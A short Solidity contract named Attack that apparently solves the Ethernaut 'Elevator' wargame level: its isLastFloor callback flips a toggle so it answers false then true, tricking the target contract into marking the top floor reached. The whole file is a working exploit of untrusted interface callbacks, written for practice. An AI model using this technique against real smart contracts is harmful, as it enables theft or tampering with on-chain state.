// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import "./Elevator.sol";

contract Attack {
    bool public toggle = true;
    Elevator public target;

    constructor(address _target) public {
        target = Elevator(_target);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint256 _floor) public {
        target.goTo(_floor);
    }
}
